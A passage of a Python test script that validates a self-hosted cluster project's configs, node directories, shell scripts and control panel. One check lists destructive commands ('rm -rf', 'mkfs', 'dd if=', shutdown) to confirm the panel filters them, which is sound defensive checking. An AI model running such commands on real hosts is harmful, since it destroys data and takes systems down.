#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
OneCloud Cluster 功能验证脚本
模拟检测所有脚本和功能是否可用
不依赖 pyyaml，使用内置解析器验证 YAML
"""

import os
import sys
import json
import re
import shutil
import subprocess
import tempfile
from pathlib import Path
from typing import Dict, List, Tuple, Optional, Any

# ============ 配置 ============
PROJECT_ROOT = Path(__file__).parent
SCRIPTS_DIR = PROJECT_ROOT / "scripts"
NODE_DIRS = {
    "wk-edge-01": PROJECT_ROOT / "node-wk-edge-01",
    "wk-iot-02": PROJECT_ROOT / "node-wk-iot-02",
    "wk-storage-03": PROJECT_ROOT / "node-wk-storage-03",
}
INVENTORY_DIR = PROJECT_ROOT / "inventory"
PANEL_DIR = PROJECT_ROOT / "panel"

# 跑 bash harness 的超时。
# Windows / Git Bash 上被测脚本每调一次外部命令就是一次进程创建（约 0.7s/次），
# 最重的 harness（bootstrap 的多场景交互）单跑就要 ~170s，180s 的上限在
# "同时跑着其它测试"时必然假失败（实测踩到：超时异常被记成测试失败）。
# 留足余量，并允许用环境变量按机器调。
HARNESS_TIMEOUT = int(os.environ.get("ONECLOUD_TEST_HARNESS_TIMEOUT", "900"))

# 节点IP映射 —— 从 inventory/nodes.yaml 动态读取, 避免硬编码 (支持用户自定义 IP)
def load_node_ip_map():
    """读取 inventory/nodes.yaml, 返回 {节点名: IP} 映射"""
    mapping = {}
    try:
        with open(INVENTORY_DIR / "nodes.yaml", encoding='utf-8') as f:
            data = simple_yaml_parse(f.read())
        for node in data.get("nodes", []):
            if node.get("name"):
                mapping[node["name"]] = node.get("ip", "")
    except Exception:
        pass
    return mapping

# 兼容旧引用的快捷别名 (调用即返回最新映射)
def NODE_IP_MAP():  # noqa: N802 - 保留旧名, 但现在是函数
    return load_node_ip_map()

# 颜色支持（Windows兼容）
try:
    import ctypes
    kernel32 = ctypes.windll.kernel32
    kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
    HAS_COLOR = True
except:
    HAS_COLOR = False

def color(text, code):
    if HAS_COLOR:
        return f"\033[{code}m{text}\033[0m"
    return text

GREEN = "92"
RED = "91"
YELLOW = "93"
CYAN = "96"

# ============ 简易 YAML 解析器 ============
def simple_yaml_parse(text: str) -> Dict[str, Any]:
    """简易 YAML 解析器，支持本项目使用的 YAML 结构"""
    result = {}
    lines = text.strip().split('\n')
    
    # 处理 nodes.yaml 格式
    if 'nodes:' in text:
        nodes = []
        current_node = None
        in_services = False
        
        for line in lines:
            stripped = line.strip()
            
            # 节点定义开始
            if stripped.startswith('- name:'):
                if current_node:
                    nodes.append(current_node)
                current_node = {'name': stripped.split(':', 1)[1].strip()}
                in_services = False
            
            # 节点属性
            elif current_node and ':' in stripped and not stripped.startswith('#'):
                key, _, value = stripped.partition(':')
                key = key.strip()
                value = value.strip()
                
                # 处理列表值
                if value.startswith('[') and value.endswith(']'):
                    value = [v.strip() for v in value[1:-1].split(',')]
                elif value == '':
                    # 可能是嵌套结构
                    pass
                
                if current_node is not None and not in_services:
                    current_node[key] = value
            
            # services 列表
            if 'services:' in stripped and stripped.startswith('services:'):
                services_str = stripped.split(':', 1)[1].strip()
                if services_str.startswith('[') and services_str.endswith(']'):
                    current_node['services'] = [s.strip() for s in services_str[1:-1].split(',')]
                    in_services = True
        
        if current_node:
            nodes.append(current_node)
        
        result['nodes'] = nodes
        
        # 提取 network 配置
        network = {}
        for line in lines:
            stripped = line.strip()
            if stripped.startswith('lan_subnet:'):
                network['lan_subnet'] = stripped.split(':', 1)[1].strip()
            elif stripped.startswith('wg_subnet:'):
                network['wg_subnet'] = stripped.split(':', 1)[1].strip()
            elif stripped.startswith('gateway:'):
                network['gateway'] = stripped.split(':', 1)[1].strip()
            elif stripped.startswith('domain:'):
                network['domain'] = stripped.split(':', 1)[1].strip()
        
        if network:
            result['network'] = network
    
    # 处理 services.yaml 格式
    if 'services:' in text:
        services = {}
        current_svc = None
        pending_key = None
        pending_is_list = None
        pending_dict = None
        
        def parse_scalar(val: str):
            """解析标量值（布尔、null、字符串）"""
            val = val.strip()
            if val == 'true':
                return True
            elif val == 'false':
                return False
            elif val == 'null' or val == '~' or val == '':
                return None
            # 内联列表
            if val.startswith('[') and val.endswith(']'):
                inner = val[1:-1].strip()
                if inner == '':
                    return []
                return [v.strip().strip('"').strip("'") for v in inner.split(',')]
            # 带引号字符串
            if len(val) >= 2:
                if (val[0] == '"' and val[-1] == '"') or (val[0] == "'" and val[-1] == "'"):
                    return val[1:-1]
            return val
        
        for line in lines:
            stripped = line.strip()
            indent = len(line) - len(line.lstrip())
            
            # 注释或空行
            if not stripped or stripped.startswith('#'):
                continue
            
            # services: 根键 - 跳过
            if indent == 0 and stripped == 'services:':
                continue
            
            # 服务名（缩进2，以冒号结尾，冒号前无其他冒号）
            if 0 < indent <= 2 and stripped.endswith(':') and ':' not in stripped[:-1]:
                svc_name = stripped[:-1]
                current_svc = svc_name
                services[svc_name] = {}
                pending_key = None
                pending_is_list = None
                pending_dict = None
                continue
            
            # 列表项（以 - 开头，缩进大于4）
            if current_svc and stripped.startswith('- ') and indent > 4:
                item_raw = stripped[2:].strip()
                item_value = parse_scalar(item_raw)
                if pending_key is not None and pending_is_list:
                    services[current_svc][pending_key].append(
                        item_value if item_value is not None else item_raw
                    )
                elif pending_key is not None and pending_is_list is None:
                    services[current_svc][pending_key] = [
                        item_value if item_value is not None else item_raw
                    ]
                    pending_is_list = True
                continue
            
            # 嵌套键值对（在 pending 字典下，缩进大于4，有冒号但非列表项）
            if current_svc and pending_dict is not None and indent > 4 and ':' in stripped and not stripped.startswith('-'):
                sub_key, _, sub_val = stripped.partition(':')
                sub_key = sub_key.strip()
                sub_val_parsed = parse_scalar(sub_val)
                if sub_val_parsed is not None:
                    pending_dict[sub_key] = sub_val_parsed
                continue
            
            # 服务属性或嵌套结构开始
            if current_svc and ':' in stripped:
                key, _, raw_value = stripped.partition(':')
                key = key.strip()
                raw_value = raw_value.strip()
                
                clean_val = raw_value
                if len(clean_val) >= 2:
                    if (clean_val[0] == '"' and clean_val[-1] == '"') or (clean_val[0] == "'" and clean_val[-1] == "'"):
                        clean_val = clean_val[1:-1]
                
                if clean_val == '' or clean_val is None:
                    # 空值：后续行决定是列表还是字典
                    pending_key = key
                    pending_is_list = None
                    pending_dict = {}
                    services[current_svc][key] = pending_dict
                else:
                    parsed = parse_scalar(raw_value)
                    services[current_svc][key] = parsed
                    pending_key = None
                    pending_is_list = None
                    pending_dict = None
        
        # 后处理：未填充的空字典转为空列表
        for svc_data in services.values():
            for key, val in list(svc_data.items()):
                if isinstance(val, dict) and len(val) == 0:
                    svc_data[key] = []
        
        result['services'] = services
    
    return result

# ============ 测试结果 ============
TEST_RESULTS = []
PASSED = 0
FAILED = 0
WARNINGS = 0

def log_pass(name: str, detail: str = ""):
    global PASSED
    PASSED += 1
    msg = f"  [PASS] {name}"
    if detail:
        msg += f" - {detail}"
    TEST_RESULTS.append(("PASS", name, detail))
    print(color(msg, GREEN))

def log_fail(name: str, detail: str = ""):
    global FAILED
    FAILED += 1
    msg = f"  [FAIL] {name}"
    if detail:
        msg += f" - {detail}"
    TEST_RESULTS.append(("FAIL", name, detail))
    print(color(msg, RED))

def log_warn(name: str, detail: str = ""):
    global WARNINGS
    WARNINGS += 1
    msg = f"  [WARN] {name}"
    if detail:
        msg += f" - {detail}"
    TEST_RESULTS.append(("WARN", name, detail))
    print(color(msg, YELLOW))

def log_info(msg: str):
    print(color(f"  [INFO] {msg}", CYAN))

# ============ 测试1: 配置文件完整性验证 ============
def test_config_files():
    """验证 YAML 和 JSON 配置文件"""
    print("\n" + "="*60)
    print("测试 1: 配置文件完整性验证")
    print("="*60)
    
    # 测试 nodes.yaml
    nodes_file = INVENTORY_DIR / "nodes.yaml"
    if not nodes_file.exists():
        log_fail("nodes.yaml 不存在")
        return False
    
    try:
        with open(nodes_file, encoding='utf-8') as f:
            nodes_text = f.read()
        
        nodes_data = simple_yaml_parse(nodes_text)
        
        if "nodes" not in nodes_data:
            log_fail("nodes.yaml 缺少 'nodes' 键")
            return False
        
        nodes = nodes_data["nodes"]
        log_pass(f"nodes.yaml 解析成功: {len(nodes)} 个节点")
        
        # 验证每个节点
        for node in nodes:
            name = node.get("name", "unknown")
            ip = node.get("ip", "")
            wg_ip = node.get("wg_ip", "")
            
            # 检查必要字段
            if not ip:
                log_fail(f"节点 {name} 缺少 IP 地址")
            elif not re.match(r'^\d+\.\d+\.\d+\.\d+$', ip):
                log_fail(f"节点 {name} IP 格式错误: {ip}")
            else:
                log_pass(f"节点 {name} IP 验证: {ip}")
            
            if not wg_ip:
                log_warn(f"节点 {name} 缺少 WireGuard IP")
            elif not re.match(r'^\d+\.\d+\.\d+\.\d+$', wg_ip):
                log_fail(f"节点 {name} WireGuard IP 格式错误: {wg_ip}")
            else:
                log_pass(f"节点 {name} WireGuard IP: {wg_ip}")
            
            # 验证 IP 映射一致性
            if name in NODE_IP_MAP():
                expected_ip = NODE_IP_MAP()[name]
                if ip == expected_ip:
                    log_pass(f"节点 {name} IP 与硬编码 fallback 一致")
                else:
                    log_warn(f"节点 {name} IP ({ip}) 与硬编码 fallback ({expected_ip}) 不一致")
        
        # 验证 network 配置
        if "network" in nodes_data:
            network = nodes_data["network"]
            if "lan_subnet" in network:
                log_pass(f"LAN 子网配置: {network['lan_subnet']}")
            if "wg_subnet" in network:
                log_pass(f"WireGuard 子网配置: {network['wg_subnet']}")
            if "gateway" in network:
                log_pass(f"网关配置: {network['gateway']}")
        
    except Exception as e:
        log_fail(f"nodes.yaml 解析错误: {str(e)}")
        return False
    
    # 测试 services.yaml
    services_file = INVENTORY_DIR / "services.yaml"
    if not services_file.exists():
        log_fail("services.yaml 不存在")
        return False
    
    try:
        with open(services_file, encoding='utf-8') as f:
            services_text = f.read()
        
        services_data = simple_yaml_parse(services_text)
        
        if "services" not in services_data:
            log_fail("services.yaml 缺少 'services' 键")
            return False
        
        services = services_data["services"]
        log_pass(f"services.yaml 解析成功: {len(services)} 个服务")
        
        # 验证服务定义
        for svc_name, svc_config in services.items():
            node = svc_config.get("node", "")
            if not node:
                log_fail(f"服务 {svc_name} 缺少 node 字段")
            elif node not in NODE_IP_MAP():
                log_warn(f"服务 {svc_name} 绑定到未知节点: {node}")
            else:
                log_pass(f"服务 {svc_name} 绑定到节点: {node}")
            
            # 验证服务类型
            is_container = svc_config.get("container", False)
            if is_container:
                image = svc_config.get("image", "")
                if image:
                    log_pass(f"服务 {svc_name} 镜像: {image}")
                else:
                    log_fail(f"容器服务 {svc_name} 缺少 image 字段")
        
    except Exception as e:
        log_fail(f"services.yaml 解析错误: {str(e)}")
        return False
    
    # 测试 panel/config.json
    panel_config = PANEL_DIR / "config.json"
    if not panel_config.exists():
        log_fail("panel/config.json 不存在")
        return False
    
    try:
        with open(panel_config, encoding='utf-8') as f:
            panel_data = json.load(f)
        
        if "nodes" not in panel_data:
            log_fail("panel/config.json 缺少 'nodes' 键")
        else:
            log_pass(f"panel/config.json 解析成功: {len(panel_data['nodes'])} 个节点")
        
        # 验证面板节点与 inventory 节点一致性
        panel_node_names = {n["name"] for n in panel_data.get("nodes", [])}
        inv_node_names = set(NODE_IP_MAP().keys())
        
        missing_in_panel = inv_node_names - panel_node_names
        extra_in_panel = panel_node_names - inv_node_names
        
        if not missing_in_panel and not extra_in_panel:
            log_pass("面板节点列表与 inventory 完全一致")
        else:
            if missing_in_panel:
                log_warn(f"面板缺少节点: {missing_in_panel}")
            if extra_in_panel:
                log_warn(f"面板多出节点: {extra_in_panel}")
        
        # 验证面板节点服务配置
        for node in panel_data.get("nodes", []):
            node_name = node.get("name", "")
            services = node.get("services", [])
            if not services:
                log_warn(f"面板节点 {node_name} 没有配置服务")
            else:
                log_pass(f"面板节点 {node_name}: {len(services)} 个服务")
                
                # 检查服务必要字段
                for svc in services:
                    if "name" not in svc:
                        log_fail(f"面板节点 {node_name} 服务缺少 'name' 字段")
                    if "display" not in svc:
                        log_warn(f"面板节点 {node_name} 服务 {svc.get('name', '?')} 缺少 'display' 字段")
                    if "container" not in svc:
                        log_warn(f"面板节点 {node_name} 服务 {svc.get('name', '?')} 缺少 'container' 字段")
        
    except json.JSONDecodeError as e:
        log_fail(f"panel/config.json JSON 解析错误: {str(e)}")
        return False
    except Exception as e:
        log_fail(f"panel/config.json 读取错误: {str(e)}")
        return False
    
    return True

# ============ 测试2: 节点目录结构验证 ============
def test_node_directories():
    """验证节点目录结构"""
    print("\n" + "="*60)
    print("测试 2: 节点目录结构验证")
    print("="*60)
    
    for node_name, node_dir in NODE_DIRS.items():
        log_info(f"检查节点 {node_name}...")
        
        # 检查目录存在
        if not node_dir.exists():
            log_fail(f"节点目录不存在: {node_dir}")
            continue
        
        log_pass(f"节点目录存在: {node_dir}")
        
        # 检查 docker-compose.yml
        compose_file = node_dir / "docker-compose.yml"
        if compose_file.exists():
            try:
                with open(compose_file, encoding='utf-8') as f:
                    compose_text = f.read()
                
                # 检查基本格式
                if 'services:' in compose_text:
                    log_pass(f"{node_name}/docker-compose.yml 包含 services 定义")
                else:
                    log_warn(f"{node_name}/docker-compose.yml 可能缺少 services")
                
                # 检查 volumes 路径
                volumes = re.findall(r'-\s*(\./[^:\s]+):', compose_text)
                if volumes:
                    log_info(f"  卷挂载: {len(volumes)} 个使用相对路径")
                
                # 检查服务数量
                svc_count = len(re.findall(r'^\w[\w-]*:\s*$', compose_text, re.MULTILINE))
                if svc_count > 0:
                    log_pass(f"{node_name} docker-compose: 约 {svc_count} 个服务")
                    
            except Exception as e:
                log_fail(f"{node_name}/docker-compose.yml 错误: {str(e)}")
        else:
            log_warn(f"{node_name} 缺少 docker-compose.yml")
        
        # 检查 .env.example
        env_example = node_dir / ".env.example"
        if env_example.exists():
            log_pass(f"{node_name}/.env.example 存在")
        else:
            log_warn(f"{node_name} 缺少 .env.example")
        
        # 检查服务子目录
        subdirs = [d for d in node_dir.iterdir() if d.is_dir()]
        log_info(f"  子目录: {len(subdirs)} 个")
        for subdir in sorted(subdirs):
            # 检查子目录是否有 init/install 脚本
            init_scripts = list(subdir.glob("init.sh")) + list(subdir.glob("install*.sh"))
            if init_scripts:
                log_pass(f"  服务 {subdir.name}: {len(init_scripts)} 个初始化脚本")
    
    return True

# ============ 测试3: 脚本语法检查 ============
def test_script_syntax():
    """检查脚本语法"""
    print("\n" + "="*60)
    print("测试 3: 脚本语法检查")
    print("="*60)
    
    # 检查 Shell 脚本
    shell_scripts = sorted(SCRIPTS_DIR.glob("*.sh"))
    log_info(f"发现 {len(shell_scripts)} 个 Shell 脚本")
    
    for script in shell_scripts:
        try:
            with open(script, encoding='utf-8') as f:
                content = f.read()

            # 仅被 source 的库文件 (lib-*.sh) 不按可执行脚本的标准要求:
            #   - 不得 set -e: 会让调用方在任何一条命令失败时直接中止 (语义污染)。
            #     注意 set -u (nounset) 是允许的 —— 本项目的 lib-nodes.sh 正是靠它
            #     给 backup.sh / deploy.sh 等「只设了 set -e」的脚本补上 nounset。
            #   - 不要求定义 log_*: 各调用方命名不同 (log_err / log_error),
            #     init.sh 还会在 source 之后覆盖同名函数。
            is_lib = script.name.startswith("lib-")

            # 检查 shebang
            if content.startswith("#!/bin/bash") or content.startswith("#!/bin/sh"):
                log_pass(f"{script.name} 有 shebang")
            else:
                log_warn(f"{script.name} 缺少 shebang")

            if is_lib:
                if re.search(r'^set -[a-z]*e', content, re.MULTILINE):
                    log_fail(f"{script.name} 作为被 source 的库设置了 set -e",
                             "会污染调用方的错误处理语义")
                else:
                    log_pass(f"{script.name} 作为被 source 的库不设置 set -e")
            else:
                # 检查 set -e 或 set -u
                if "set -e" in content or "set -u" in content:
                    log_pass(f"{script.name} 有错误处理 (set -e/-u)")
                else:
                    log_warn(f"{script.name} 缺少 set -e/-u")

                # 检查 log 函数
                has_log_info = "log_info" in content
                has_log_error = "log_error" in content
                if has_log_info and has_log_error:
                    log_pass(f"{script.name} 有日志函数")
                elif not has_log_info:
                    log_warn(f"{script.name} 缺少 log_info 函数")
                elif not has_log_error:
                    log_warn(f"{script.name} 缺少 log_error 函数")

            # 检查基本结构
            functions = re.findall(r'^(\w+)\(\)\s*\{', content, re.MULTILINE)
            if functions:
                log_info(f"  函数: {', '.join(functions[:10])}{'...' if len(functions) > 10 else ''}")

        except Exception as e:
            log_fail(f"{script.name} 读取错误: {str(e)}")
    
    # 检查 Python 脚本
    python_scripts = list(PROJECT_ROOT.glob("**/*.py"))
    python_scripts = [s for s in python_scripts if '.git' not in str(s) and '__pycache__' not in str(s)]
    
    log_info(f"发现 {len(python_scripts)} 个 Python 脚本")
    
    for script in python_scripts:
        try:
            with open(script, encoding='utf-8') as f:
                content = f.read()
            
            # 检查 shebang
            if content.startswith("#!/usr/bin/env python") or content.startswith("#!/usr/bin/python"):
                log_pass(f"{script.name} 有 shebang")
            
            # Python 使用缩进而非大括号，跳过括号配对检查
            
            # 检查必要 import
            imports = re.findall(r'^import (\w+)|^from (\w+) import', content, re.MULTILINE)
            if imports:
                module_names = [i[0] or i[1] for i in imports[:5]]
                log_info(f"  导入: {', '.join(module_names)}")
                
        except Exception as e:
            log_fail(f"{script.name} 读取错误: {str(e)}")
    
    return True

# ============ 测试4: deploy.sh 节点映射验证 ============
def test_deploy_node_mapping():
    """验证 deploy.sh 节点目录映射"""
    print("\n" + "="*60)
    print("测试 4: deploy.sh 节点映射验证")
    print("="*60)
    
    deploy_script = SCRIPTS_DIR / "deploy.sh"
    if not deploy_script.exists():
        log_fail("deploy.sh 不存在")
        return False
    
    try:
        with open(deploy_script, encoding='utf-8') as f:
            content = f.read()
        
        # 解析 NODES 数组
        nodes_pattern = r'NODES=\((.*?)\)'
        nodes_match = re.search(nodes_pattern, content, re.DOTALL)
        if not nodes_match:
            log_fail("无法解析 NODES 数组")
            return False
        
        nodes_block = nodes_match.group(1)
        node_entries = re.findall(r'"([^"]+)"', nodes_block)
        
        log_info(f"deploy.sh 中定义的节点:")
        for entry in node_entries:
            parts = entry.split("|")
            if len(parts) >= 3:
                name, ip, suffix = parts[0], parts[1], parts[2]
                log_info(f"  {name} | {ip} | {suffix}")
                
                # 验证目录后缀与节点名一致
                if suffix == name:
                    log_pass(f"节点 {name} 目录后缀 '{suffix}' 与节点名一致")
                else:
                    log_fail(f"节点 {name} 目录后缀 '{suffix}' 与节点名 '{name}' 不一致")
                
                # 验证目录存在
                node_dir = PROJECT_ROOT / f"node-{suffix}"
                if node_dir.exists():
                    log_pass(f"节点 {name} 对应目录存在: node-{suffix}")
                else:
                    log_fail(f"节点 {name} 对应目录不存在: node-{suffix}")
        
        # 验证与 inventory 一致性
        log_info("与 inventory 验证一致性:")
        for entry in node_entries:
            parts = entry.split("|")
            if len(parts) >= 3:
                name, ip = parts[0], parts[1]
                expected_ip = NODE_IP_MAP().get(name, "")
                
                if expected_ip and ip == expected_ip:
                    log_pass(f"节点 {name} IP {ip} 与 inventory 一致")
                elif expected_ip:
                    log_warn(f"节点 {name} IP {ip} 与 inventory {expected_ip} 不一致")
    
    except Exception as e:
        log_fail(f"deploy.sh 解析错误: {str(e)}")
        return False
    
    return True

# ============ 测试5: restore.sh 和 backup.sh fallback 机制 ============
def test_fallback_mechanism():
    """验证 restore.sh 和 backup.sh 的 fallback 机制"""
    print("\n" + "="*60)
    print("测试 5: restore.sh 和 backup.sh fallback 机制")
    print("="*60)
    
    for script_name in ["restore.sh", "backup.sh"]:
        script_path = SCRIPTS_DIR / script_name
        if not script_path.exists():
            log_fail(f"{script_name} 不存在")
            continue
        
        try:
            with open(script_path, encoding='utf-8') as f:
                content = f.read()
            
            # 新设计: 节点 IP 应来自 inventory/nodes.yaml (经 lib-nodes.sh),
            # 脚本内不得写死旧文档里的 192.168.1.10x 地址 (用户要求 IP 可自定义)
            uses_lib = ("lib-nodes.sh" in content) or ("source " in content and "lib" in content)
            hardcoded_hits = re.findall(r'192\.168\.1\.10[0-9]', content)
            uses_node_func = ("node_ip" in content) or ("node_resolve" in content) or ("node_by_ip" in content)

            if uses_lib:
                log_pass(f"{script_name} 引用 lib-nodes.sh (IP 从清单动态读取)")
            else:
                log_warn(f"{script_name} 未发现 lib-nodes.sh 引用, 请确认节点解析来源")

            if not hardcoded_hits:
                log_pass(f"{script_name} 无硬编码节点 IP (符合自定义要求)")
            else:
                log_fail(f"{script_name} 仍硬编码 IP: {sorted(set(hardcoded_hits))}")

            if uses_node_func:
                log_pass(f"{script_name} 使用 node_* 函数解析节点")
            else:
                log_warn(f"{script_name} 未发现 node_* 节点解析调用")
                
        except Exception as e:
            log_fail(f"{script_name} 解析错误: {str(e)}")
    
    return True

# ============ 测试6: health-check.sh 变量声明 ============
def test_health_check_variables():
    """验证 health-check.sh 变量声明位置"""
    print("\n" + "="*60)
    print("测试 6: health-check.sh 变量声明验证")
    print("="*60)
    
    health_script = SCRIPTS_DIR / "health-check.sh"
    if not health_script.exists():
        log_fail("health-check.sh 不存在")
        return False
    
    try:
        with open(health_script, encoding='utf-8') as f:
            content = f.read()
            lines = content.split('\n')
        
        # 检查在函数外使用 local 关键字
        # 先找到所有函数定义的行号范围
        function_ranges = []
        in_function = False
        func_start = 0
        brace_count = 0
        
        for i, line in enumerate(lines, 1):
            if not in_function and re.match(r'^\w+\(\)\s*\{', line):
                in_function = True
                func_start = i
                brace_count = 0
            elif in_function:
                brace_count += line.count('{')
                brace_count -= line.count('}')
                if brace_count <= 0:
                    function_ranges.append((func_start, i))
                    in_function = False
        
        # 检查 local 变量声明
        issues_found = False
        for i, line in enumerate(lines, 1):
            if 'local ' in line and not line.strip().startswith('#'):
                # 检查是否在函数内
                in_any_function = any(start <= i <= end for start, end in function_ranges)
                if not in_any_function:
                    # 检查这是否是变量声明部分（WireGuard/Syncthing 状态检查）
                    context_start = max(0, i - 5)
                    context = '\n'.join(lines[context_start:i])
                    
                    if 'WireGuard' in context or 'Syncthing' in context:
                        log_warn(f"health-check.sh 第 {i} 行: local 变量在函数外声明 - {line.strip()[:60]}")
                        issues_found = True
        
        if not issues_found:
            log_pass("health-check.sh 没有在函数外使用 local 关键字")
        else:
            log_fail("health-check.sh 存在 local 变量在函数外声明的问题")
        
        # 验证 WireGuard 检查变量
        wg_section = re.search(
            r'# ---- WireGuard Mesh ----.*?(?=# ----|\Z)',
            content, re.DOTALL
        )
        if wg_section:
            section = wg_section.group(0)
            peers_match = re.search(r'^peers=', section, re.MULTILINE)
            if peers_match:
                peers_line = peers_match.start()
                wg_line_context = section[:peers_line].split('\n')[-2] if peers_line > 0 else ""
                if 'local ' in wg_line_context:
                    log_fail("WireGuard 检查的 peers 变量前有 local 关键字")
                else:
                    log_pass("WireGuard 检查的 peers 变量声明正确")
        
        # 验证 Syncthing 检查变量
        st_section = re.search(
            r'# ---- Syncthing.*?(?=\Z)',
            content, re.DOTALL
        )
        if st_section:
            section = st_section.group(0)
            st_match = re.search(r'^st_devices=', section, re.MULTILINE)
            if st_match:
                st_line = st_match.start()
                st_line_context = section[:st_line].split('\n')[-2] if st_line > 0 else ""
                if 'local ' in st_line_context:
                    log_fail("Syncthing 检查的 st_devices 变量前有 local 关键字")
                else:
                    log_pass("Syncthing 检查的 st_devices 变量声明正确")
    
    except Exception as e:
        log_fail(f"health-check.sh 解析错误: {str(e)}")
        return False
    
    return True

# ============ 测试7: setup.sh cloudflared 命令 ============
def test_cloudflared_command():
    """验证 setup.sh cloudflared 命令"""
    print("\n" + "="*60)
    print("测试 7: setup.sh cloudflared 命令验证")
    print("="*60)
    
    setup_script = SCRIPTS_DIR / "setup.sh"
    if not setup_script.exists():
        log_fail("setup.sh 不存在")
        return False
    
    try:
        with open(setup_script, encoding='utf-8') as f:
            content = f.read()
        
        # 查找 install_cloudflared 函数
        cf_func = re.search(
            r'install_cloudflared\(\)\s*\{(.*?)\n\}',
            content, re.DOTALL
        )
        if not cf_func:
            log_fail("无法找到 install_cloudflared 函数")
            return False
        
        func_body = cf_func.group(1)
        
        # 检查有 token 的命令
        if 'cloudflare/cloudflared:latest tunnel --no-autoupdate run --token' in func_body:
            log_pass("有 token 时 cloudflared 命令包含 'run --token'")
        else:
            log_fail("有 token 时 cloudflared 命令可能缺少 'run'")
        
        # 检查无 token 的命令
        if re.search(r'cloudflare/cloudflared:latest tunnel --no-autoupdate run\s*$', func_body, re.MULTILINE):
            log_pass("无 token 时 cloudflared 命令包含 'run'")
        elif 'cloudflared:latest tunnel --no-autoupdate run' in func_body:
            log_pass("无 token 时 cloudflared 命令包含 'run' 参数")
        else:
            log_fail("无 token 时 cloudflared 命令缺少 'run' 参数")
        
        # 检查 install_panel 函数
        panel_func = re.search(
            r'install_panel\(\)\s*\{(.*?)\n\}',
            content, re.DOTALL
        )
        if panel_func:
            panel_body = panel_func.group(1)
            
            # 检查是否有从项目复制面板的逻辑
            if 'project_panel' in panel_body:
                log_pass("install_panel 包含从项目复制面板的逻辑")
            
            if 'cp -r' in panel_body:
                log_pass("install_panel 有 cp -r 复制操作")
            
            # 检查 fallback 逻辑
            if 'else' in panel_body:
                log_pass("install_panel 有 fallback 逻辑")
            
            # 检查最小面板生成
            if 'PYEOF' in panel_body or 'app.py' in panel_body:
                log_pass("install_panel 能生成最小面板应用")
    
    except Exception as e:
        log_fail(f"setup.sh 解析错误: {str(e)}")
        return False
    
    return True

# ============ 测试8: panel/app.py load_config 错误处理 ============
def test_panel_app_error_handling():
    """验证 panel/app.py 错误处理"""
    print("\n" + "="*60)
    print("测试 8: panel/app.py 错误处理验证")
    print("="*60)
    
    app_file = PANEL_DIR / "app.py"
    if not app_file.exists():
        log_fail("panel/app.py 不存在")
        return False
    
    try:
        with open(app_file, encoding='utf-8') as f:
            content = f.read()
        
        # 检查 load_config 函数
        load_config = re.search(
            r'def load_config\(\):(.*?)(?=\ndef|\Z)',
            content, re.DOTALL
        )
        if not load_config:
            log_fail("找不到 load_config 函数")
            return False
        
        func_body = load_config.group(1)
        
        # 检查 try-except
        if 'try:' in func_body and 'except' in func_body:
            log_pass("load_config 有 try-except 块")
        else:
            log_fail("load_config 缺少 try-except 错误处理")
        
        # 检查 FileNotFoundError 处理
        if 'FileNotFoundError' in func_body:
            log_pass("load_config 处理 FileNotFoundError")
        
        # 检查 JSONDecodeError 处理
        if 'JSONDecodeError' in func_body:
            log_pass("load_config 处理 JSONDecodeError")
        
        # 检查默认返回值
        if 'cluster_name' in func_body and 'nodes' in func_body:
            log_pass("load_config 有默认返回值")
        
        # 验证默认值结构
        default_match = re.search(r'"cluster_name":\s*"([^"]*)"', func_body)
        if default_match:
            cluster_name = default_match.group(1)
            log_pass(f"默认集群名称: {cluster_name}")
        
        # 验证 CONFIG_PATH 使用环境变量
        config_env = re.search(
            r'CONFIG_PATH\s*=.*os\.environ\.get\("PANEL_CONFIG"',
            content
        )
        if config_env:
            log_pass("CONFIG_PATH 支持环境变量 PANEL_CONFIG")
        else:
            log_warn("CONFIG_PATH 可能不支持环境变量")
        
        # 检查 run_ssh 函数
        if 'def run_ssh' in content:
            log_pass("有 run_ssh 函数")
        
        # 检查异常处理
        if 'except subprocess.TimeoutExpired' in content:
            log_pass("run_ssh 处理 TimeoutExpired 异常")
        
        if 'except Exception as e' in content:
            log_pass("run_ssh 处理通用异常")
        
        # 检查危险命令过滤
        dangerous_keywords = ['rm -rf', 'mkfs', 'dd if=', 'shutdown', 'reboot', 'poweroff']
        dangerous_found = [kw for kw in dangerous_keywords if kw in content]
        if dangerous_found:
            log_info(f"  危险命令过滤关键字: {dangerous_found}")
        
        if 'dangerous' in content.lower() and 'for d in dangerous' in content:
            log_pass("exec_command 有危险命令过滤")
    
    except Exception as e:
        log_fail(f"panel/app.py 解析错误: {str(e)}")
        return False
    
    return True

# ============ 测试9: install-services.sh xiaomusic 下载 ============
def test_xiaomusic_download():
    """验证 install-services.sh xiaomusic 下载逻辑"""
    print("\n" + "="*60)
    print("测试 9: install-services.sh xiaomusic 下载验证")
    print("="*60)
    
    script = SCRIPTS_DIR / "install-services.sh"
    if not script.exists():
        log_fail("install-services.sh 不存在")
        return False
    
    try:
        with open(script, encoding='utf-8') as f:
            content = f.read()
        
        # 查找 install_xiaomusic 函数
        func_match = re.search(
            r'install_xiaomusic\(\)\s*\{(.*?)\n\}',
            content, re.DOTALL
        )
        if not func_match:
            log_fail("找不到 install_xiaomusic 函数")
            return False
        
        func_body = func_match.group(1)
        
        # 检查架构检测
        if 'aarch64|arm64' in func_body:
            log_pass("检测 aarch64/arm64 架构")
        
        if 'x86_64' in func_body:
            log_pass("检测 x86_64 架构")
        
        # 检查默认架构
        if 'arch="armv7"' in func_body or 'arch = "armv7"' in func_body:
            log_pass("默认架构为 armv7")
        
        # 检查下载 URL 过滤
        if 'browser_download_url' in func_body:
            log_pass("使用 browser_download_url 过滤下载链接")
        
        if 'grep.*linux' in func_body or re.search(r'grep.*linux.*arch', func_body):
            log_pass("下载 URL 按架构过滤")
        
        # 检查解压逻辑
        if 'tar xzf' in func_body:
            log_pass("使用 tar xzf 解压")
        
        # 检查临时目录
        if 'mktemp -d' in func_body:
            log_pass("使用 mktemp 创建临时目录")
    
    except Exception as e:
        log_fail(f"install-services.sh 解析错误: {str(e)}")
        return False
    
    return True

# ============ 测试10: panel/install-service.sh 路径变量化 ============
def test_panel_install_service():
    """验证 panel/install-service.sh 路径变量化"""
    print("\n" + "="*60)
    print("测试 10: panel/install-service.sh 路径验证")
    print("="*60)
    
    script = PANEL_DIR / "install-service.sh"
    if not script.exists():
        log_fail("panel/install-service.sh 不存在")
        return False
    
    try:
        with open(script, encoding='utf-8') as f:
            content = f.read()
        
        # 检查是否使用变量
        if 'PANEL_DIR=' in content:
            log_pass("使用 PANEL_DIR 变量")
        
        # 检查动态路径计算
